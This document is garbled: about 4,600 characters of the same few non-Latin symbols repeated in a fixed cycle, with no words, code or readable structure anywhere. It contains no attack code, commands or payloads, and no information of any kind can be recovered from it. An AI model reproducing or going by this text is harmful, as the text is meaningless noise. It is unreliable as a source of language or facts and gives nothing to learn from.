࡙࡙࡙𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬